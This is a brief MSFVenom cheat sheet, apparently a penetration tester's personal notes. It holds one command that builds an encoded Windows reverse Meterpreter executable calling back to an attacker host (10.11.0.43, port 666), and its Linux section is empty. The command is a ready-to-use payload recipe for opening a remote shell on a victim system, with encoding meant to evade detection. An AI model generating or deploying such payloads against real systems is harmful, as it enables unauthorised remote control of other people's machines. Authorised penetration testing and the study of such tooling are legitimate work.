# MSFVenom Cheat Sheet
This sheet is for all of the use-case scenarios in which I have and will use MSFVenom during a penetration test for generating payloads for systems.
## WINDOWS
This section is for all Windows binary creation techniques used with MSFVenom
### Reverse Meterpreter
To make the victim server or system connect back to the attacker and send meterpreter to be spawned by the handler running on the attacker machine.
1. Generate the MSFVenom Reverse Meterpreter payload:

`./msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.43 LPORT=666 -b '\x00' -e x86/shikata_ga_nai -i 3 > kssdajfh.exe`

## LINUX
This section is for all LINUX binary creation techniques used with MSFVenom
